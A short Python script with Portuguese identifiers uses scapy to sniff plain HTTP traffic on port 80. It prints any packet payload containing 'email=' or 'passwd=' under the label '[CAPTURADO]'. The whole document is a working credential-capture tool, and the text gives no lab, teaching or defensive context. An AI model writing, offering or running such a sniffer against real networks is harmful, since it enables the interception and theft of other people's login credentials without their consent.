from scapy.all import *


def capturar(pacote):
    if pacote.haslayer(Raw):
        data = pacote[Raw].load.decode(errors="ignore")

        if "email=" in data.lower() or "passwd=" in data.lower():
            print("[CAPTURADO]")
            print(data)


sniff(filter="tcp port 80", prn=capturar, store=False)
